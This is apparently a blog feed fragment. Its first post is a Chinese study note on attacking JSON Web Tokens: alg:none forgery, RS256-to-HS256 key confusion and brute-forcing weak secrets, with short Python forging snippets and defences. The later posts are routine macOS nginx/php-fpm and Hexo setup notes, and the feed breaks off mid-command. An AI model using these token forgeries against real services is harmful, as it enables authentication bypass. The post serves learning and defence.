    <link href="http://0clickjacking0.github.io/2019/07/09/JWT-JSON-Web-Token-%E6%94%BB%E5%87%BB/"/>
    <id>http://0clickjacking0.github.io/2019/07/09/JWT-JSON-Web-Token-攻击/</id>
    <published>2019-07-09T04:26:13.000Z</published>
    <updated>2019-07-09T11:22:45.464Z</updated>
    
    <content type="html"><![CDATA[<p>最近这次国赛遇到了json web token的题目，发现并不能很顺利的做出来，于是写下这篇学习笔记</p><a id="more"></a><h1 id="什么是JWT"><a href="#什么是JWT" class="headerlink" title="什么是JWT"></a>什么是JWT</h1><p>JSON Web Token（JWT）是一个非常轻巧的规范。这个规范允许我们使用JWT在两个组织之间传递安全可靠的信息。</p><p>现在网上大多数介绍JWT的文章实际介绍的都是JWS(JSON Web Signature),也往往导致了人们对于JWT的误解，但是JWT并不等于JWS，JWS只是JWT的一种实现，除了JWS外，JWE(JSON Web Encryption)也是JWT的一种实现。</p><h1 id="JWT的组成"><a href="#JWT的组成" class="headerlink" title="JWT的组成"></a>JWT的组成</h1><p>我们随便来看一个：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJoZWxsbyIsImlhdCI6MTU2MjUwNDkxOCwiZXhwIjoxNTYyNTA0OTIzLCJhY2NvdW50Ijoia2sifQ.GqWnsUjzpqtE4GJrZ5Zim_nrwnQTGAlidoGqe3354yM</span><br></pre></td></tr></table></figure><p>JWT的格式非常简单</p><p>JWT的数据分为三个部分： <code>headers</code> , <code>payloads</code>，<code>signature(签名)</code></p><p>三者通过<code>.</code>分割，均采用<code>base64编码</code></p><h2 id="Headers"><a href="#Headers" class="headerlink" title="Headers"></a>Headers</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9</span><br><span class="line"></span><br><span class="line">解码后为：</span><br><span class="line">&#123;</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;,</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>alg为算法的缩写，typ为类型的缩写，有时候还会有kid，kid表示算法所使用的密钥文件（当服务端需要多个密钥文件时使用）</p><h2 id="Payloads"><a href="#Payloads" class="headerlink" title="Payloads"></a>Payloads</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">eyJpc3MiOiJoZWxsbyIsImlhdCI6MTU2MjUwNDkxOCwiZXhwIjoxNTYyNTA0OTIzLCJhY2NvdW50Ijoia2sifQ</span><br><span class="line"></span><br><span class="line">解码后为：</span><br><span class="line">&#123;</span><br><span class="line">  &quot;iss&quot;: &quot;hello&quot;,</span><br><span class="line">  &quot;iat&quot;: 1562504918,</span><br><span class="line">  &quot;exp&quot;: 1562504923,</span><br><span class="line">  &quot;account&quot;: &quot;kk&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这几个字段的含义如下，其中需要注意的字段是exp，这字段可在一定程度上被用来防止重放攻击</p><p>iss(issuer)：发布者的url地址</p><p>sub(subject)：该JWT所面向的用户，用于处理特定应用，不是常用的字段</p><p>aud(audience)：接受者的url地址</p><p>exp(expiration)：该jwt销毁的时间；unix时间戳</p><p>nbf(not before)：该jwt的使用时间不能早于该时间；unix时间戳</p><p>iat(issued at)：该jwt的发布时间；unix 时间戳</p><p>jti(JWT ID)：该jwt的唯一ID编号</p><h2 id="Signature"><a href="#Signature" class="headerlink" title="Signature"></a>Signature</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GqWnsUjzpqtE4GJrZ5Zim_nrwnQTGAlidoGqe3354yM</span><br></pre></td></tr></table></figure><p>因为header和payload是明文存储的，所以签名是为了防止数据被修改的，提供了对数据的交易功能<br>签名常使用RS256(RSA 非对称加密，使用私钥签名)、HS256(HMAC SHA256 对称加密)算法，签名对象为base64encode(headers) + ‘.’ + base64encode(payloads)</p><h1 id="攻击JWT"><a href="#攻击JWT" class="headerlink" title="攻击JWT"></a>攻击JWT</h1><h2 id="1-敏感信息泄露"><a href="#1-敏感信息泄露" class="headerlink" title="1. 敏感信息泄露"></a>1. 敏感信息泄露</h2><p>很明显的一点，因为payload是明文传输的，所以如果payload中存在敏感信息就会出现信息泄露。当服务端的秘钥泄密的时候，JWT的伪造就变得非常简单容易。对此，服务端应该妥善保管好私钥，以免被他人窃取。</p><h2 id="2-修改算法为none"><a href="#2-修改算法为none" class="headerlink" title="2. 修改算法为none"></a>2. 修改算法为none</h2><p>签名算法保证了JWT在传输的过程中不被恶意用户修改</p><p>但是header中的alg字段可被修改为none</p><p>一些JWT库支持none算法，即没有签名算法，当alg为none时后端不会进行签名校验</p><p>将alg修改为none后，去掉JWT中的signature数据（仅剩header + ‘.’ + payload + ‘.’）然后提交到服务端即可</p><p>这种攻击的例子可以参考：<a href="http://demo.sjoerdlangkemper.nl/jwtdemo/hs256.php" target="_blank" rel="noopener">http://demo.sjoerdlangkemper.nl/jwtdemo/hs256.php</a></p><p>代码可以在Github上找到 <a href="https://github.com/Sjord/jwtdemo/" target="_blank" rel="noopener">https://github.com/Sjord/jwtdemo/</a></p><p>这个例子的解法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 原headers:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9</span></span><br><span class="line"><span class="comment"># 解码后:&#123;"typ": "JWT","alg": "HS256"&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 原payloads：eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTU2MjY2MjkyNSwiZXhwIjoxNTYyNjYzMDQ1LCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0</span></span><br><span class="line"><span class="comment"># 解码后:&#123; "iss": "http://demo.sjoerdlangkemper.nl/", "iat": 1562662925,"exp": 1562663045,"data": &#123;"hello": "world"&#125;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新构造新的</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">headers = <span class="string">"&#123;\"typ\":\"JWT\",\"alg\":\"none\"&#125;"</span></span><br><span class="line">payloads = <span class="string">"&#123;\"data\":\"test\"&#125;"</span></span><br><span class="line">bytesHeaders = headers.encode(encoding=<span class="string">"utf-8"</span>)</span><br><span class="line">encodeHead = base64.b64encode(bytesHeaders)</span><br><span class="line">bytesPay = payloads.encode(encoding=<span class="string">"utf-8"</span>)</span><br><span class="line">encodePay = base64.b64encode(bytesPay)</span><br><span class="line">print( encodeHead.decode()+ <span class="string">'.'</span> +encodePay.decode() + <span class="string">'.'</span>)</span><br></pre></td></tr></table></figure><p>如何把得出的值传入到可控的参数中，可以看到<code>alg</code>已经被我们修改成了<code>none</code></p><p><img src="http://images.xianyu123.club/JWT1.png" alt></p><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><ol><li><p>不允许出现 none 的方法；</p></li><li><p>将开启 alg : none 作为一种额外的配置选项。</p></li></ol><h2 id="3-将算法RS256修改为HS256（非对称密码算法-gt-对称密码算法）"><a href="#3-将算法RS256修改为HS256（非对称密码算法-gt-对称密码算法）" class="headerlink" title="3. 将算法RS256修改为HS256（非对称密码算法=&gt;对称密码算法）"></a>3. 将算法RS256修改为HS256（非对称密码算法=&gt;对称密码算法）</h2><p>算法HS256使用秘密密钥对每条消息进行签名和验证。</p><p>算法RS256使用私钥对消息进行签名，并使用公钥进行验证。</p><p>如果将算法从RS256更改为HS256，后端代码会使用公钥作为秘密密钥，然后使用HS256算法验证签名。</p><p>由于公钥有时可以被攻击者获取到，所以攻击者可以修改header中算法为HS256，然后使用RSA公钥对数据进行签名。</p><p>后端代码会使用RSA公钥+HS256算法进行签名验证。</p><p>同样的，可以通过一个例子来理解这种攻击方式 <a href="http://demo.sjoerdlangkemper.nl/jwtdemo/rs256.php" target="_blank" rel="noopener">http://demo.sjoerdlangkemper.nl/jwtdemo/rs256.php</a></p><p>RSA公钥：<a href="http://demo.sjoerdlangkemper.nl/jwtdemo/public.pem" target="_blank" rel="noopener">http://demo.sjoerdlangkemper.nl/jwtdemo/public.pem</a></p><p>这个例子的解法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 原headers:eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9</span></span><br><span class="line"><span class="comment"># 解码后:&#123;"typ": "JWT", "alg": "RS256"&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 原payloads：eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTU2MjY2NzkwMSwiZXhwIjoxNTYyNjY4MDIxLCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0</span></span><br><span class="line"><span class="comment"># 解码后:&#123;"iss": "http://demo.sjoerdlangkemper.nl/","iat": 1562667901,"exp": 1562668021,"data": &#123;"hello": "world"&#125;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新构造：</span></span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="comment"># public.pem从上面的公钥地址下载，一般ctf比赛中都会有公钥泄漏可以下载的</span></span><br><span class="line">public = open(<span class="string">'public.pem'</span>, <span class="string">'r'</span>).read()</span><br><span class="line">print(jwt.encode(&#123;<span class="string">"data"</span>:<span class="string">"test"</span>&#125;, key=public, algorithm=<span class="string">'HS256'</span>))</span><br></pre></td></tr></table></figure><p>如果遇到报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jwt.exceptions.InvalidKeyError: The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret.</span><br></pre></td></tr></table></figure><p>解决如下：</p><p><code>pip3 install pyjwt==0.4.3</code></p><p>如何把得出的值传入到可控的参数中，可以看到我们绕过了<code>RS256</code>算法，把它变成了<code>HS256</code>算法，且数据可控</p><p><img src="http://images.xianyu123.club/JWT2.png" alt></p><h2 id="4-HS256（对称加密）密钥破解"><a href="#4-HS256（对称加密）密钥破解" class="headerlink" title="4. HS256（对称加密）密钥破解"></a>4. HS256（对称加密）密钥破解</h2><p>如果HS256密钥强度较弱，则可以直接强制使用，通过爆破 HS256的秘钥可以完成该操作。难度比较低。</p><p>破解工具<a href="https://github.com/brendan-rius/c-jwt-cracker*" target="_blank" rel="noopener">c-jwt-cracker</a></p><p>使用方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJMM3l4IiwiaWF0IjoxNTYyNTA0OTE4LCJleHAiOjE1NjI1MDQ5MjMsImFjY291bnQiOiJrayJ9.CJcfvv6JbajrhNriA2-Hb_2yYCUy5aeAvUjVzdgBytw</span><br></pre></td></tr></table></figure><h3 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h3><p>使用复杂的秘钥即可</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ol><li><a href="https://www.jianshu.com/p/50ade6f2e4fd" target="_blank" rel="noopener">一篇文章带你分清楚JWT,JWS与JWE</a></li><li><p><a href="https://www.anquanke.com/post/id/145540" target="_blank" rel="noopener">Json Web Token历险记</a></p></li><li><p><a href="https://www.cnblogs.com/dliv3/p/7450057.html" target="_blank" rel="noopener">Hacking JWT(JSON Web Token)</a></p></li><li><p><a href="https://xz.aliyun.com/t/2338" target="_blank" rel="noopener">JSON Web Token (JWT) 攻击技巧</a></p></li><li><a href="https://www.freebuf.com/articles/web/180874.html" target="_blank" rel="noopener">深入了解Json Web Token之概念篇</a></li><li><a href="https://www.freebuf.com/articles/web/181261.html" target="_blank" rel="noopener">深入了解Json Web Token之实战篇</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近这次国赛遇到了json web token的题目，发现并不能很顺利的做出来，于是写下这篇学习笔记&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://0clickjacking0.github.io/categories/Web-Security/"/>
    
    
  </entry>
  
  <entry>
    <title>mac下安装多版本php和配置php-fpm的一些坑</title>
    <link href="http://0clickjacking0.github.io/2019/05/28/mac%E4%B8%8B%E5%AE%89%E8%A3%85%E5%A4%9A%E7%89%88%E6%9C%ACphp%E5%92%8C%E9%85%8D%E7%BD%AEphp-fpm%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9D%91/"/>
    <id>http://0clickjacking0.github.io/2019/05/28/mac下安装多版本php和配置php-fpm的一些坑/</id>
    <published>2019-05-28T11:01:50.000Z</published>
    <updated>2019-05-28T13:06:17.788Z</updated>
    
    <content type="html"><![CDATA[<p>mac下安装多版本php和配置php-fpm的一些坑</p><a id="more"></a><h2 id="phpbrew的安装"><a href="#phpbrew的安装" class="headerlink" title="phpbrew的安装"></a>phpbrew的安装</h2><p>请参考<a href="https://github.com/phpbrew/phpbrew/blob/master/README.cn.md" target="_blank" rel="noopener">phpbrew的安装</a></p><h2 id="php-v和（php-fpm或-phpinfo-）版本不一样"><a href="#php-v和（php-fpm或-phpinfo-）版本不一样" class="headerlink" title="php -v和（php-fpm或 phpinfo()）版本不一样"></a>php -v和（php-fpm或 phpinfo()）版本不一样</h2><p>用<code>phpbrew</code>安装<code>php5.6.30</code>，然后用<code>phpbrew switch php-5.6.30</code>切换成<code>5.6.30</code></p><p>在终端下使用<code>php -v</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PHP 5.6.30 (cli) (built: May 14 2019 18:30:16)</span><br><span class="line">Copyright (c) 1997-2016 The PHP Group</span><br><span class="line">Zend Engine v2.6.0, Copyright (c) 1998-2016 Zend Technologies</span><br></pre></td></tr></table></figure><p>在终端下使用<code>php-fpm -v</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PHP 7.1.16 (fpm-fcgi) (built: Mar 31 2018 03:00:16)</span><br><span class="line">Copyright (c) 1997-2018 The PHP Group</span><br><span class="line">Zend Engine v3.1.0, Copyright (c) 1998-2018 Zend Technologies</span><br></pre></td></tr></table></figure><p>在web端如下</p><p><img src="http://images.xianyu123.club/php-fpm_problem.png" alt></p><h3 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h3><h4 id="添加php-fpm软链"><a href="#添加php-fpm软链" class="headerlink" title="添加php-fpm软链"></a>添加php-fpm软链</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ln -s /Users/kb/.phpbrew/php/php-5.6.30/sbin/php-fpm /usr/sbin/php-fpm</span><br></pre></td></tr></table></figure><p>如果<code>/usr/sbin</code>下存在<code>php-fpm</code>，就先把原来的删除</p><p>创建软连接以后，关闭终端，重新进入，分别运行<code>php -v</code>和<code>php-fpm -v</code>看下版本是否一致</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">php -v</span><br><span class="line">PHP 5.6.30 (cli) (built: May 28 2019 16:01:05)</span><br><span class="line">Copyright (c) 1997-2016 The PHP Group</span><br><span class="line">Zend Engine v2.6.0, Copyright (c) 1998-2016 Zend Technologies</span><br><span class="line"></span><br><span class="line">php-fpm -v</span><br><span class="line">PHP 5.6.30 (fpm-fcgi) (built: May 28 2019 16:01:14)</span><br><span class="line">Copyright (c) 1997-2016 The PHP Group</span><br><span class="line">Zend Engine v2.6.0, Copyright (c) 1998-2016 Zend Technologies</span><br></pre></td></tr></table></figure><p>配置完上面后，在web页面打开会遇到访问php页面404的问题</p><h2 id="解决nginx访问php页面404问题"><a href="#解决nginx访问php页面404问题" class="headerlink" title="解决nginx访问php页面404问题"></a>解决nginx访问php页面404问题</h2><p>查看<code>php5.6.30 sock</code>的绝对路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat ./.phpbrew/php/php-5.6.30/etc/php-fpm.conf | grep &quot;listen = /&quot;</span><br></pre></td></tr></table></figure><p>然后把这个路径添加到nginx 的配置文件中，nginx 的配置文件在<code>/usr/local/etc/nginx/nginx.conf</code></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">location</span> <span class="regexp">~ \.php$</span> &#123;</span><br><span class="line">  <span class="attribute">root</span>           html;</span><br><span class="line">  <span class="attribute">fastcgi_pass</span>   unix:路径地址;</span><br><span class="line">  <span class="attribute">fastcgi_index</span>  index.php;</span><br><span class="line">  <span class="attribute">include</span>        fastcgi.conf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="解决Permission-denied-while-connecting-to-upstream问题"><a href="#解决Permission-denied-while-connecting-to-upstream问题" class="headerlink" title="解决Permission denied while connecting to upstream问题"></a>解决Permission denied while connecting to upstream问题</h2><p>过程中碰到<code>[crit] 2963#0: *138 connect() to unix:/tmp/php5-fpm.sock failed (13: Permission denied) while connecting to upstream</code>的问题, 这是由于没有指定nginx的用户, nginx的用户没有权限访问fpm造成的<br>在<code>/Users/kb/.phpbrew/php/php-5.6.30/etc/php-fpm.conf</code>中找到<code>listen</code>行, 在后面添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">listen.owner = nobody</span><br><span class="line">listen.group = nobody</span><br></pre></td></tr></table></figure><p>并且在<code>/usr/local/etc/nginx/nginx.conf</code>中找到<code>user</code>行, 默认的是被注释掉的, 取消注释, 这时的用户是nobody, 重启nginx和fpm, 问题得到解决</p><p>然后就可以愉快地使用php+nginx 5.6版本了</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://www.leavesongs.com/PHP/php7-nginx-mysql-install-note.html" target="_blank" rel="noopener">php7 + nginx + mysql 安装小计</a></p><p><a href="https://juejin.im/post/5c8fb28a6fb9a07103548318" target="_blank" rel="noopener">笔记：MAC使用brew配置nginx、php、mysql、php-fpm、redis</a></p><p><a href="https://www.cnblogs.com/mrzero/p/4295536.html" target="_blank" rel="noopener">Mac OS下配置PHP Nginx PHP-FPM</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;mac下安装多版本php和配置php-fpm的一些坑&lt;/p&gt;
    
    </summary>
    
      <category term="Mac" scheme="http://0clickjacking0.github.io/categories/Mac/"/>
    
    
  </entry>
  
  <entry>
    <title>mac下搭建nginx+php-fpm</title>
    <link href="http://0clickjacking0.github.io/2019/05/13/mac%E4%B8%8B%E6%90%AD%E5%BB%BAnginx-php-fpm/"/>
    <id>http://0clickjacking0.github.io/2019/05/13/mac下搭建nginx-php-fpm/</id>
    <published>2019-05-13T06:31:20.000Z</published>
    <updated>2019-05-28T11:12:36.738Z</updated>
    
    <content type="html"><![CDATA[<p>mac下搭建nginx+php-fpm的笔记</p><a id="more"></a><h2 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h2><p>如果没有安装过brew，请参考<a href="https://www.jianshu.com/p/ab50ea8b13d6" target="_blank" rel="noopener">Mac OS下brew的安装和使用</a></p><h3 id="1-停止本地Apache服务"><a href="#1-停止本地Apache服务" class="headerlink" title="1. 停止本地Apache服务"></a>1. 停止本地Apache服务</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apachectl stop</span><br></pre></td></tr></table></figure><h3 id="2-安装nginx"><a href="#2-安装nginx" class="headerlink" title="2. 安装nginx"></a>2. 安装nginx</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install nginx</span><br></pre></td></tr></table></figure><h3 id="3-启动nginx"><a href="#3-启动nginx" class="headerlink" title="3. 启动nginx"></a>3. 启动nginx</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nginx -s reload</span><br></pre></td></tr></table></figure><h3 id="4-访问nginx"><a href="#4-访问nginx" class="headerlink" title="4. 访问nginx"></a>4. 访问nginx</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">打开浏览器,输入如下网址,正确的情况就可以看到如下的截图.</span><br><span class="line">http://127.0.0.1:8080</span><br></pre></td></tr></table></figure><p><img src="http://images.xianyu123.club/nginx_mac.png" alt></p><h3 id="5-文件说明"><a href="#5-文件说明" class="headerlink" title="5. 文件说明"></a>5. 文件说明</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">通过上面的步骤,就表示nginx已经完成了.这里有几个文件,我们需要关注一下.</span><br><span class="line"></span><br><span class="line">/usr/local/etc/nginx/nginx.conf （配置文件路径）</span><br><span class="line"></span><br><span class="line">/usr/local/var/www （服务器默认路径）</span><br><span class="line"></span><br><span class="line">/usr/local/Cellar/nginx/1.8.0 （安装路径)</span><br></pre></td></tr></table></figure><h3 id="6-配置php"><a href="#6-配置php" class="headerlink" title="6.  配置php"></a>6.  配置php</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">1.去掉nginx.conf中如下代码中的注释(在去掉之前最好备份一份 cp nginx.conf nginx.conf.bak)</span><br><span class="line">location ~ \.php$ &#123;</span><br><span class="line">    fastcgi_pass   127.0.0.1:9000;</span><br><span class="line">    fastcgi_index  index.php;</span><br><span class="line">    fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;</span><br><span class="line">    include        fastcgi_params;</span><br><span class="line">&#125;</span><br><span class="line">该段代码的主要意思就是让nginx能够解析到php,不然你去访问php的文件,nginx会默认下载该php文件</span><br><span class="line"></span><br><span class="line">2.修改1中的部分配置</span><br><span class="line">原配置中的值为/scripts$fastcgi_script_name, 需要修改为$document_root$fastcgi_script_name</span><br><span class="line">该代码主要的意思就是让nginx能够识别到nginx配置文件中的root项.不然会报not find file错误信息.</span><br><span class="line"></span><br><span class="line">3.然后重启nginx服务</span><br><span class="line">nginx -s reload</span><br><span class="line"></span><br><span class="line">4.配置php-fpm文件</span><br><span class="line">sudo cp /private/etc/php-fpm.conf.default /private/etc/php-fpm.conf</span><br><span class="line">修改我们新复制的php-fpm.conf文件中的如下配置项目.修改为下面的示例,记得把前面的分号去掉，默认是注释的</span><br><span class="line">pid=/usr/local/var/run/php-fpm.pid</span><br><span class="line">error_log=/usr/local/var/log/php-fpm.log</span><br><span class="line"></span><br><span class="line">5.启动php-fpm服务</span><br><span class="line">sudo php-fpm</span><br></pre></td></tr></table></figure><p>启动服务的时候可能会遇到下面的问题,反正我是遇到了(下面的路径根据你图片指示的路径来定,可能有的环境路径不一致).解决办法是</p><p><img src="http://images.xianyu123.club/nginx_mac_error.jpeg" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /data/server/php7/etc/php-fpm.d/www.conf.default /data/server/php7/etc/php-fpm.d/www.conf</span><br></pre></td></tr></table></figure><p>然后在启动一次,即可</p><p>在修改服务器默认路径需要用绝对路径，不能用<code>～</code>的相对路径</p><h3 id="7-测试"><a href="#7-测试" class="headerlink" title="7. 测试"></a>7. 测试</h3><p>在服务器目录下新建一个php文件，内容为<code>&lt;?php phpinfo(); ?&gt;</code>，访问这个文件，如果出现的是<code>phpinfo</code>的页面代表成功了</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="http://www.imooc.com/article/283670" target="_blank" rel="noopener">Mac系统下搭建Nginx+php-fpm</a></p><p><a href="https://blog.csdn.net/zhengwish/article/details/79380088" target="_blank" rel="noopener">ERROR: failed to open error_log (/usr/var/log/php-fpm.log)</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;mac下搭建nginx+php-fpm的笔记&lt;/p&gt;
    
    </summary>
    
      <category term="Mac" scheme="http://0clickjacking0.github.io/categories/Mac/"/>
    
    
  </entry>
  
  <entry>
    <title>换电脑后如何迁移hexo博客</title>
    <link href="http://0clickjacking0.github.io/2019/05/11/%E6%8D%A2%E7%94%B5%E8%84%91%E5%90%8E%E5%A6%82%E4%BD%95%E8%BF%81%E7%A7%BBhexo%E5%8D%9A%E5%AE%A2/"/>
    <id>http://0clickjacking0.github.io/2019/05/11/换电脑后如何迁移hexo博客/</id>
    <published>2019-05-11T13:46:05.000Z</published>
    <updated>2019-05-11T14:07:06.114Z</updated>
    
    <content type="html"><![CDATA[<p>网上也有类似的教程，但是每次都要去上网查询怎么去配置，比较耗时。所以就自己记录下来，方便以后看。</p><a id="more"></a><h2 id="开始前准备"><a href="#开始前准备" class="headerlink" title="开始前准备"></a>开始前准备</h2><p>本博文默认<code>git</code>,<code>nodejs</code>已经安装好</p><h2 id="分析文件"><a href="#分析文件" class="headerlink" title="分析文件"></a>分析文件</h2><h3 id="1-哪些文件是必须拷贝走的-拷贝到新的电脑"><a href="#1-哪些文件是必须拷贝走的-拷贝到新的电脑" class="headerlink" title="1.哪些文件是必须拷贝走的(拷贝到新的电脑)"></a>1.哪些文件是必须拷贝走的(拷贝到新的电脑)</h3><p>首先是之前自己修改的文件，像配置文件<code>_config.yml</code>,<code>theme</code>文件夹，<code>source</code>文件夹自己写的原始文件这些都是必须要拷贝走的。除此之外还有<code>scaffolds</code>文件夹(文件的模板)，<code>package.json</code>(使用哪些包)，<code>.gitignore</code>(提交忽略哪些文件夹)<br>总结：</p><ul><li><code>_config.yml</code></li><li><code>theme</code></li><li><code>source</code></li><li><code>scaffolds</code></li><li><code>package.json</code></li><li><code>.gitignore</code></li></ul><p><strong>这些是需要拷贝的</strong></p><h3 id="2-哪些文件是需要忽略不用管的"><a href="#2-哪些文件是需要忽略不用管的" class="headerlink" title="2.哪些文件是需要忽略不用管的"></a>2.哪些文件是需要忽略不用管的</h3><ul><li><p><code>.git</code></p></li><li><p><code>node_mouldes/</code> </p></li><li><p><code>public/</code> </p></li><li><p><code>.deploy_git/</code> </p></li><li><p><code>db.json</code></p></li></ul><h2 id="开始迁移"><a href="#开始迁移" class="headerlink" title="开始迁移"></a>开始迁移</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// 全局安装hexo</span><br><span class="line">sudo npm install hexo-cli -g</span><br><span class="line"></span><br><span class="line">// 把必须拷贝的文件，拷贝到新建的文件夹内，执行以下命令</span><br><span class="line">// 在新建的文件夹内打开命令行，安装必要的模块，初始化</span><br><span class="line">// 这里不用hexo init初始化，因为配置文件我们已经拷贝过来(一定要慎重，严格按照教程来)</span><br><span class="line"></span><br><span class="line">sudo npm install</span><br><span class="line"></span><br><span class="line">// 安装其他一些必要的组件</span><br><span class="line">sudo npm install hexo-deployer-git --save</span><br><span class="line"></span><br><span class="line">sudo npm install 